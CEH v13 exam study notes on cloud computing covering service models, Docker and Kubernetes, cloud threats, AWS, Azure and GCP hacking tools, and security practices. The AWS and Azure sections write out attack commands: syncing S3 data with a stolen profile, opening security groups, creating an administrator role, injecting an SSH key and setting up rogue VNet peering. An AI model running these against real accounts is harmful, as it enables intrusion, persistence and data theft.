# Module 19: Cloud Computing

> **Exam:** 312-50
**Source:** EC-Council Official Curricula — CEH v13
Ce module est le plus volumineux de tous (342 pages, 8 objectifs).
> 

---

## 📋 Table of Contents

1. [Cloud Computing Concepts](https://claude.ai/chat/fc638238-2f8e-4332-8658-6a758501181f#1-cloud-computing-concepts)
2. [Cloud Computing Threats](https://claude.ai/chat/fc638238-2f8e-4332-8658-6a758501181f#2-cloud-computing-threats)
3. [Cloud Hacking Methodology](https://claude.ai/chat/fc638238-2f8e-4332-8658-6a758501181f#3-cloud-hacking-methodology)
4. [AWS Hacking](https://claude.ai/chat/fc638238-2f8e-4332-8658-6a758501181f#4-aws-hacking)
5. [Microsoft Azure Hacking](https://claude.ai/chat/fc638238-2f8e-4332-8658-6a758501181f#5-microsoft-azure-hacking)
6. [Google Cloud Hacking](https://claude.ai/chat/fc638238-2f8e-4332-8658-6a758501181f#6-google-cloud-hacking)
7. [Container Hacking](https://claude.ai/chat/fc638238-2f8e-4332-8658-6a758501181f#7-container-hacking)
8. [Cloud Security](https://claude.ai/chat/fc638238-2f8e-4332-8658-6a758501181f#8-cloud-security)
9. [Quick Exam Cheat Sheet](https://claude.ai/chat/fc638238-2f8e-4332-8658-6a758501181f#9-quick-exam-cheat-sheet)

---

## 1. Cloud Computing Concepts

### 🎯 What is Cloud Computing?

> Cloud computing delivers various types of services/applications over the Internet. Major cloud service providers: **Google, Amazon, Microsoft**.
> 

---

### 📊 Cloud Service Types

| Type | Description | Examples |
| --- | --- | --- |
| **IaaS** (Infrastructure-as-a-Service) | Provides computing, networking, storage on demand; subscriber rents infrastructure | AWS EC2, Azure VMs, Google Compute Engine |
| **PaaS** (Platform-as-a-Service) | Development tools, config management, deployment platforms; no need to manage software/infrastructure underneath | Google App Engine, Salesforce, Microsoft Azure |
| **SaaS** (Software-as-a-Service) | Application software on-demand over Internet; pay-per-use/subscription/advertising | Google Docs, Salesforce CRM, Freshbooks |
| **XaaS** (Anything-as-a-Service) | Broad category covering any service delivered via Internet; high scalability | Covers IaaS, PaaS, SaaS combined |
| **FWaaS** (Firewalls-as-a-Service) | Cloud-based network protection; packet filtering, network analyzing, IPsec | Zscaler, SecurityHQ, Fortinet, Cisco, Sophos |
| **DaaS** (Desktop-as-a-Service) | On-demand virtual desktops/apps; provider manages infra, compute, storage, backup | Amazon WorkSpaces, Citrix, Azure Windows Virtual Desktop |

---

### 📊 Cloud Deployment Models

| Model | Description | Examples |
| --- | --- | --- |
| **Public Cloud** | Resources owned/managed by third-party CSP; shared via Internet; Boundary Controller between org and CSP | AWS, Azure, GCP |
| **Private Cloud** (Internal/Corporate) | Infrastructure operated by single org within corporate firewall; full control over data | BMC Software, VMware vRealize Suite, SAP Cloud |
| **Community Cloud** | Shared among organizations with common concerns (compliance, security); can be managed by members or third party | HIPAA-compliant shared environments |
| **Hybrid Cloud** | Combination of two or more cloud models bound together | AWS Outposts, Azure Arc |
| **Multi-Cloud** | Combination of private/public/community clouds; avoids vendor lock-in | AWS + GCP together |
| **Distributed Cloud** | Cloud services distributed across different physical locations (ORG's Network Edge, Operator Edge, Customer Edge, Local Data Center) |  |
| **Poly Cloud** | Several types of cloud services on a single platform; provides features from different cloud services based on need | GCP + AWS |

---

### 📊 Cloud vs. Grid Computing (CRITICAL TABLE)

| Cloud Computing | Grid Computing |
| --- | --- |
| Client-server architecture | Distributed computing architecture |
| Higher scalability | Standard scalability |
| Centralized resources | Collaborative resources |
| More flexible | Less flexible |
| Infrastructure providers own cloud servers | Organization owns/manages grids |
| IaaS, PaaS, SaaS | Distributed information, computing, pervasive systems |
| Regular web protocols | Grid middleware |
| Pay-as-you-go | No user payment required |
| Service-oriented | Application-oriented |
| Large-scale resource pool | Limited assets/resources |
| No interoperability support → vendor lock-in risk | Supports interoperability |

---

### ☁️ Fog vs. Edge Computing

| Model | Description |
| --- | --- |
| **Fog Computing** | Extends cloud capabilities to network edge via intelligent gateway processing at LAN level |
| **Edge Computing** | Subset of fog; processing performed at programmable automation controllers; distributed, decentralized; stores data close to edge devices; used for processing small/urgent operations in milliseconds; reduces Internet bandwidth and data offload |

---

### 📊 Virtual Machines vs. Containers (CRITICAL TABLE)

| Virtual Machines | Containers |
| --- | --- |
| Heavyweight | Lightweight and portable |
| Independent operating systems | Share a single host OS |
| Hardware-based virtualization | OS-based virtualization |
| Slower provisioning | Scalable/real-time provisioning |
| Limited performance | Native performance |
| Completely isolated (more secure) | Process-level isolation (partially secured) |
| Created/launched in minutes | Created/launched **in seconds** |

**Architecture difference:** VMs: App → Bins/Libs → Guest OS → Hypervisor → Host OS. Containers: App → Bins/Libs → Container Engine → Host OS.

---

### 🐳 Docker Architecture

> Docker employs a client/server model. Communication via **REST API**. Components: **Docker Daemon (dockerd)**, **Docker Client**, **Docker Registries** (Docker Hub = predefined public location for images).
> 

**Docker Engine**: Client Docker CLI → Rest API → Server Docker daemon → manages Containers, Images, Network, Data Volumes.

**Docker Swarm:** Swarm mode enables managing multiple Docker engines — communicates with containers, expands/reduces container count based on load, health checks, failover redundancy, timely software updates.

**Docker Networking — 5 native network drivers:**

```
Host        — container implements host networking stack
Bridge      — creates a Linux bridge on the host (managed by Docker)
Overlay     — enables container communication over physical network infrastructure
MACVLAN     — creates network connection between container interfaces and parent host interface
None        — implements own networking stack; completely isolated from host
```

**Container Network Model (CNM):** Sandbox (container network stack config), Endpoint (abstracted connection to network), Network (interconnected collection of endpoints). CNM has 2 driver interfaces: Network Drivers and IPAM Drivers.

---

### ☸️ Kubernetes Cluster Architecture (CRITICAL)

```
Kubernetes Master:
├── kube-apiserver     — responds to all API requests; front-end for control panel; only component
│                        that interacts with etcd; ensures data storage
├── etcd cluster       — distributed consistent key-value storage for cluster data, service
│                        discovery, API objects
├── kube-scheduler     — scans newly generated pods; allocates nodes based on resource
│                        requirements, data locality, hardware/software/policy restrictions
├── kube-controller-manager
└── cloud-controller-manager

Kubernetes Nodes (Worker Nodes):
├── kubelet            — agent running on each worker node; ensures containers run in pods
└── kube-proxy         — network proxy running on each node
```

**Kubernetes Features:** Self-healing, Secret/config management, Auto-scaling, Load balancing, Service discovery, Rolling updates, Resource management.

---

### ⚡ Serverless Computing

> Functions-as-a-Service (FaaS); developers focus on code only; cloud provider manages infrastructure/scaling.
> 

**Frameworks:** AWS Lambda, Google Cloud Functions, Microsoft Azure Functions, Serverless Framework, AWS Fargate, Alibaba Cloud Function Compute.

---

### 📊 OWASP Top 10 Kubernetes Risks (K01-K10)

```
K01: Insecure Workload Configurations    K06: Broken Authentication Mechanisms
K02: Supply Chain Vulnerabilities         K07: Missing Network Segmentation Controls
K03: Overly Permissive RBAC Configs      K08: (continues)
K04: Lack of Centralized Policy           K09: (continues)
     Enforcement                          K10: (continues)
K05: Inadequate Logging and Monitoring
```

---

## 2. Cloud Computing Threats

### 📊 Cloud Computing Threats Master Diagram (CRITICAL)

**Data Security:** Data breach/loss | Loss of operational/security logs | Malicious insiders | Illegal access to cloud | Loss of business reputation (co-tenant) | Loss of encryption keys | Theft of computer equipment | Loss/modification of backup data | Improper data handling/disposal

**Cloud Service Misuse:** Abuse and nefarious use of cloud services | Undertaking malicious probes/scans

**Interface and API Security:** Insecure interfaces and APIs

**Operational Security:** Insufficient due diligence | Shared tech issues | Unknown risk profile | Unsynchronized system clocks | Inadequate infrastructure design | Conflicts between client hardening and cloud | Cloud provider acquisition | Network management failure | Loss of governance | Compliance risks | Economic DoS (EDoS) | Limited cloud usage visibility

**Infrastructure & System Config:** Natural disasters | Hardware failure | Supply chain failure | Isolation failure | Cloud service termination/failure | Weak Control Plane

**Network Security:** Modifying network traffic | Management interface compromise | Authentication attacks | VM-level attacks | Hijacking accounts

**Governance & Legal Risks:** Lock-in | Licensing risks | Risks from jurisdictional changes | Subpoena and e-discovery

**Development & Resource Management:** Privilege escalation | Insecure software development practices | Resource exhaustion | Lack of security architecture

---

### 🎯 Key Cloud Attack Types

| Attack | Description |
| --- | --- |
| **Side-Channel / Cross-guest VM Breach** | Attacker runs VM on same physical host as victim's VM; exploits shared CPU Cache to steal cryptographic keys/secrets. Types: Timing Attack, Data Remanence, Acoustic Cryptanalysis, Power Monitoring Attack, Differential Fault Analysis |
| **Man-in-the-Cloud (MITC)** | Tricks victim into installing malware that plants attacker's sync token on victim's Drive → Drive syncs with attacker's account → attacker steals sync token → accesses victim's files → restores original token (stays undetected). Countermeasures: CASB, email security gateway, MFA, 2FA |
| **Cryptojacking** | Attacker compromises cloud service → victim connects and unknowingly mines cryptocurrency for attacker. Monitor port 48101 for Mirai infections |
| **Cloudborne** | Attacker injects persistent backdoor on bare-metal server → server is decommissioned and assigned to new customer with backdoor intact → attacker monitors/exfiltrates new customer data |
| **IMDS Attack** | Exploits SSRF or zero-day vulnerability to capture EC2 metadata → gains access to cloud resources. Countermeasure: Use IMDSv2 instead of IMDSv1 |
| **Cloud Snooper** | Uses rootkit to bypass AWS Security Groups; forwards all packets on port 80/443 → rootkit identifies C2 traffic and sends on non-standard ports (1010, 2020, 6060, 7070, 8080, 9999) → reconstructs with source port 80 or 443 to exfiltrate |
| **Golden SAML Attack** | Steals key + certificate from Identity Provider (ADFS) → forges SAML response → accesses service provider's services as any user |
| **Session Hijacking XSS** | Attacker hosts page with malicious script on cloud server → user's browser collects and sends cookies → redirects to attacker server |
| **Session Riding** | CSRF via cross-site request forgery on active session during cloud login |
| **Cryptanalysis in Cloud** | Exploits weak random number generation or insecure encryption; sniffs traffic and performs cryptanalysis on encrypted data |

---

### 📊 OWASP Top 10 Serverless Security Risks (A1-A10)

```
A1: Injection                    A6: Sensitive Data Exposure
A2: Broken Authentication        A7: Server-Side Request Forgery
A3: Broken Object Property       A8: Insecure Deserialization
     Level Auth                  A9: Using Components with Known
A4: Unrestricted Resource              Vulnerabilities
     Consumption                 A10: Insufficient Logging and Monitoring
A5: Broken Function Level Auth
```

---

## 3. Cloud Hacking Methodology

### 📊 3 Elements of Cloud Hacking

```
1. Web Applications Hacking  — target cloud-based Web APIs; exploit auth/authorization flaws
2. System Hacking            — exploit VMs, containers, serverless functions; gain unauthorized access
3. Cloud Platform Hacking    — exploit weak passwords, unpatched services, misconfigurations
```

### 📊 4 Phases of Cloud Hacking

```
1. Reconnaissance (Identifying Target Cloud Environment)
2. Vulnerability Assessment (Nessus, OpenVAS, Qualys)
3. Exploitation (custom scripts, Metasploit, sqlmap, thc-hydra)
4. Post-Exploitation (Cobalt Strike, Metasploit — persistence, lateral movement, C2)
```

**Note:** Each cloud provider (AWS, Azure, GCP) has specific rules/policies for ethical hacking. Always notify before hacking. **Cloud hacking is typically feasible only through internal means.**

**Reconnaissance — Shodan Filters:**

```
port:443                        # HTTPS services in cloud environments
ssl.cert.issuer.cn:Amazon       # AWS services (SSL cert issued by Amazon)
cloud.region:<Region_code>      # Specific cloud region
org:Microsoft                   # Microsoft Azure devices/services
product:Kubernetes              # Kubernetes instances
Amazon web services Facebook    # AWS-hosted Facebook services
```

---

## 4. AWS Hacking

### 🔍 S3 Bucket Enumeration

> S3 (Simple Storage Service) — scalable cloud storage where files/objects stored via Web APIs. Attackers exploit S3 bucket misconfigurations to compromise data privacy.
> 

**S3 Enumeration Techniques:**

```
Inspecting HTML        — source code analysis to find URLs in S3 buckets
Brute-forcing URL      — URL: http://s3.amazonaws.com/[bucket_name]
```

**Tool: CloudBrute**

```bash
./cloudbrute -d <target.com> -k <keyword> -t 80 -T 10 -w /<path_to_wordlist>.txt
# -d: target bucket hosting domain
# -k: keyword/pattern to search
# -t: threads
# -T: timeout
# -w: wordlist file
```

Other S3 tools: S3Scanner, Bucket Flaws, BucketLoot.

---

### 🔐 AWS IAM Privilege Escalation Techniques

```
Create a new user access key           → iam:CreateAccessKey
Create/update login profile            → iam:CreateLoginProfile / UpdateLoginProfile
Attach policy to user/group/role       → iam:AttachUserPolicy / AttachGroupPolicy / AttachRolePolicy
Create/update inline policy            → iam:PutUserPolicy / PutGroupPolicy / PutRolePolicy
Add user to a group                    → iam:AddUserToGroup
```

**Hijacking Misconfigured IAM Roles (Pacu):**

> If role "AWS":"*" (poorly configured) exists, any user with valid AWS account can assume the role and obtain credentials.
> 

**Tool: Pacu** — open-source AWS exploitation framework for enumerating/hijacking IAM roles (1100+ wordlist of commonly used role names).

**Tool: Cloudsplaining** — IAM policy analysis identifying: Privilege Escalation, Resource Exposure, Infrastructure Modification, Data Exfiltration, Credentials Exposure.

**Tool: DumpsterDiver** — scans large volumes of file types for hardcoded secret keys (AWS access keys, SSL keys, Azure keys).

```bash
dumpsterDiver -p /path/to/scan
dumpsterDiver -p /path/to/scan -e AWS_KEY
```

---

### 🔧 Key AWS Enumeration/Exploitation Commands

```bash
# Identify security groups with vulnerable open ports exposed to Internet
aws ec2 describe-security-groups \
  --filter Name=ip-permission.cidr,Values=0.0.0.0/0,::/0 \
  --filter Name=ip-permission.from-port,Values=<port numbers>

# Define unrestricted network access at specific port
aws ec2 authorize-security-group-ingress --group-id <security group ID> \
  --protocol <protocol> --port <port number> --cidr 0.0.0.0/0

# SSRF exploitation — retrieve IAM credentials, then access S3
aws sts get-caller-identity --profile stolen_profile
aws s3 ls --profile stolen_profile
aws s3 sync s3://bucket-name /home/attacker/localstash/targetcloud/ --profile stolen_profile

# Create malicious IAM role for persistence
aws iam create-role --role-name <Role-name> --assume-role-policy-document file://Test-Role-Trust-Policy.json
aws iam attach-role-policy --role-name <Role-name> --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
```

**AWS Persistence Techniques:**

```
Startup scripts: echo "/path/to/malicious/script.sh" >> /etc/rc.local; chmod +x /path/to/malicious/script.sh
SSH Key Injection: echo "ssh-rsa AAAAB3... attacker_key" >> ~/.ssh/authorized_keys
Installing Rootkits: hide malicious processes from monitoring tools
Leveraging IAM Roles: create new roles with elevated permissions or modify existing
```

**Other AWS Recon Tools:**

```
Masscan     — fast port scanning: sudo masscan -p0-65535 <target> --rate=1000
Ghostbuster — scan for dangling elastic IPs via AWS Route 53 DNS
Cartography — graph-based visualization of AWS infrastructure (identifies exposed EC2/RDS)
Scout Suite — multi-cloud security auditing (EC2, IAM, S3, CloudTrail, CloudWatch, etc.)
```

---

## 5. Microsoft Azure Hacking

### 🔍 Azure Reconnaissance

**Tool: AADInternals** — PowerShell module for administering Azure AD and Office 365 (reconnaissance, exploitation, post-exploitation).

```powershell
# Start tenant recon
Invoke-AADIntReconAsOutsider -Domain <domain name> | Format-Table
# Get login information
Get-AADIntLoginInformation -Domain <domain name>
$results = Invoke-AADIntReconAsGuest
# Get all registered domains from tenant
Get-AADIntTenantDomains -Domain <domain name>
```

**Tool: AzureGraph** — Azure AD enumeration tool.

```python
# Authenticate and create login session
gr <- create_graph_login()
# View all users in Azure AD tenant
gr$list_users()
# Get info about authenticated user
me <- gr$get_user("username")
# View group memberships
head(me$list_group_memberships())
# Retrieve applications owned by user
me$list_owned_objects(type="application_name")
```

**Password Spraying** — Automated password guessing for Azure AD accounts without causing lockouts (attempts single password against all accounts simultaneously). Tool: **Spray365**.

---

### 🔧 Azure Exploitation Techniques

**VNet Peering Exploitation:**

```bash
# Create unauthorized peering connections
az network vnet peering create -g TargetResourceGroup -n AttackerVnetToTargetVnet \
  --vnet-name AttackerVnet --remote-vnet TargetVnetId --allow-vnet-access

# Enable traffic forwarding
az network vnet peering update -g TargetResourceGroup -n AttackerVnetToTargetVnet \
  --vnet-name AttackerVnet --set allowForwardedTraffic=true

# Enable gateway transit
az network vnet peering update -g TargetResourceGroup -n AttackerVnetToTargetVnet \
  --vnet-name AttackerVnet --set allowGatewayTransit=true
```

---

## 6. Google Cloud Hacking

### 🔍 GCP Reconnaissance

**Tool: GCP Scanner** — Determines level of access that credentials possess within GCP. Supports: GCE, GCS, GKE, App Engine, Cloud SQL, BigQuery, Spanner, Pub/Sub, Cloud Functions, BigTable, CloudStore, KMS, Cloud Services. Can extract credentials from GCP VM instance metadata, gcloud profiles, OAuth2 Refresh Tokens, GCP service account keys.

**Tool: GCPGoat** — Intentionally vulnerable GCP environment for practicing GCP attacks (SSRF, misconfigured storage bucket policies, lateral movement).

---

## 7. Container Hacking

### 🔍 Container Reconnaissance

**Registry Enumeration Commands:**

```bash
docker login <registry-url>
curl -s https://hub.docker.com/v2/repositories/<username>/
curl -u <username>:<password> https://<registry-url>/v2/_catalog
curl -u <username>:<password> https://<registry-url>/v2/<image-name>/tags/list

# Kubernetes service account enumeration
kubectl get serviceaccounts
kubectl describe serviceaccounts
```

---

### 🔧 Container/Kubernetes Vulnerability Scanning Tools

```
Trivy         — container image vulnerability scanning (OS packages, app dependencies: Alpine, RHEL, CentOS, Bundler, npm, yarn)
              Command: trivy <target> [--scanners <scanner1,scanner2>] <subject>
Sysdig        — identifies Kubernetes vulnerabilities via CI/CD pipeline, image registry, K8s admissions controllers
Kubescape     — Kubernetes vulnerability scanning
kube-hunter   — Kubernetes vulnerability hunting
kubeaudit     — Kubernetes security audit
KubiScan      — Kubernetes security scanning
Krane         — Kubernetes deployment analysis
```

---

## 8. Cloud Security

### 🛡️ Best Practices for Securing the Cloud (24-Point Checklist — CRITICAL)

1. Enforce data protection, backup, and retention mechanisms
2. Enforce SLAs for patching and vulnerability remediation
3. Vendors should regularly undergo AICPA SSAE 18 Type II audits
4. Verify one's own cloud in public domain blacklists
5. Enforce legal contracts in employee behavior policy
6. Prohibit user credentials sharing among users, applications, and services
7. Implement strong authentication, authorization, and auditing controls
8. Check for data protection at both the design stage and at runtime
9. Implement strong key generation, storage, management, and destruction practices
10. Monitor the client's traffic for any malicious activities
11. Prevent unauthorized server access using security checkpoints
12. Disclose applicable logs and data to customers
13. Analyze cloud provider security policies and SLAs
14. Assess the security of cloud APIs and log customer network traffic
15. Ensure the cloud undergoes regular security checks and updates
16. Ensure that physical security is a 24×7×365 affair
17. Enforce security standards in installation/configuration
18. Ensure memory, storage, and network access is isolated
19. Leverage strong two-factor authentication techniques where possible
20. Implement a baseline security breach notification process
21. Analyze API dependency chain software modules
22. Enforce stringent registration and validation processes
23. Perform vulnerability and configuration risk assessments
24. Disclose infrastructure information, security patching, and firewall details

---

### 🛡️ Cloud Security Tools

**CASB (Cloud Access Security Broker):** Monitor/control cloud traffic between users and cloud services.
**CSPM (Cloud Security Posture Management):** Continuous monitoring and assessment of cloud configuration.

**Tool: Scout Suite** — Multi-cloud security auditing (ACM, CloudFormation, CloudTrail, CloudWatch, Config, EC2, EFS, ELB, IAM, KMS, RDS, RedShift, Route53, S3). Represents risk ratings with different colors.

**Next-Generation Secure Web Gateway (NG SWG):** Cloud-based security solution protecting from cloud-based threats; features: URL filtering, TLS/SSL decryption, CASB operations, ATP + sandboxing + ML anomaly detection, DLP, qualitative metadata. Solutions: Netskope, Cloudflare Gateway, Skyhigh SWG, Menlo SWG, McAfee MVISION UCE.

---

## 9. Quick Exam Cheat Sheet

### 📊 Cloud Service Types

```
IaaS → infrastructure (VMs, storage, networking)
PaaS → platform (development tools, databases)
SaaS → software (applications)
FWaaS → cloud firewall
DaaS → virtual desktops
```

---

### 📊 VMs vs Containers — Key Differences

```
VMs: heavyweight, own OS, hardware virtualization, minutes to create, completely isolated
Containers: lightweight, share host OS, OS virtualization, SECONDS to create, process-level isolation
```

---

### 📊 Docker Network Drivers (5)

```
Host | Bridge | Overlay | MACVLAN | None
```

---

### 📊 Kubernetes Master Components

```
kube-apiserver | etcd | kube-scheduler | kube-controller-manager | cloud-controller-manager
```

---

### 📊 Cloud Hacking Phases

```
Reconnaissance → Vulnerability Assessment → Exploitation → Post-Exploitation
```

---

### 🔑 Key Tools by Platform

```
AWS:   CloudBrute (S3), Pacu (IAM roles), Cloudsplaining (IAM policies),
       DumpsterDiver (secret keys), Masscan (ports), Scout Suite (audit),
       Ghostbuster (DNS), Cartography (graph visualization)

Azure: AADInternals (recon), AzureGraph (AD enumeration), Spray365 (password spray),
       PowerZure, MicroBurst

GCP:   GCP Scanner, GCPGoat (intentionally vulnerable), gcp_service_enum

Container: Trivy, Sysdig, Kubescape, kube-hunter, kubeaudit, CloudBrute
```

---

### 🔥 Common Exam Scenarios

**Q: What virtualization type do containers use?**
→ **OS-based virtualization** (VMs use hardware-based)

**Q: How long does it take to create containers vs VMs?**
→ Containers: **seconds** | VMs: **minutes**

**Q: What are the 5 Docker native network drivers?**
→ **Host, Bridge, Overlay, MACVLAN, None**

**Q: What are the Kubernetes Master components?**
→ **kube-apiserver, etcd cluster, kube-scheduler, kube-controller-manager, cloud-controller-manager**

**Q: What tool brute-forces and enumerates S3 buckets?**
→ **CloudBrute**

**Q: What tool is an open-source AWS exploitation framework for IAM role hijacking?**
→ **Pacu** (contains 1100+ commonly used role names wordlist)

**Q: What attack injects a persistent backdoor on a bare-metal server before it's assigned to a new customer?**
→ **Cloudborne Attack**

**Q: What attack exploits CPU cache sharing between VMs on the same physical host?**
→ **Side-Channel Attack / Cross-guest VM Breach**

**Q: What attack replaces a victim's Drive sync token with the attacker's?**
→ **Man-in-the-Cloud (MITC) Attack**

**Q: What Shodan filter identifies AWS-hosted services via SSL certificates?**
→ `ssl.cert.issuer.cn:Amazon`

**Q: What tool is a PowerShell module for Azure AD/Office 365 reconnaissance?**
→ **AADInternals** (`Invoke-AADIntReconAsOutsider`)

**Q: What tool analyzes IAM policies to identify privilege escalation risks?**
→ **Cloudsplaining** (maps IAM risk landscape)

**Q: What tool scans files for hardcoded AWS/Azure/SSL keys?**
→ **DumpsterDiver**

**Q: What is the recommended countermeasure against IMDS attacks?**
→ Use **IMDSv2 instead of IMDSv1**, turn off IMDS when not required, restrict IMDS access

**Q: What are the 24 best practices for securing the cloud focused on?**
→ Data protection, SLA enforcement, audit requirements, legal contracts, authentication/authorization/auditing, key management, traffic monitoring, security checkpoints, logs disclosure, API security, regular security checks/updates, isolation, 2FA, breach notification

---

*Notes compiled from CEH v13 Official Curricula — EC-Council | Exam 312-50 | Module 19*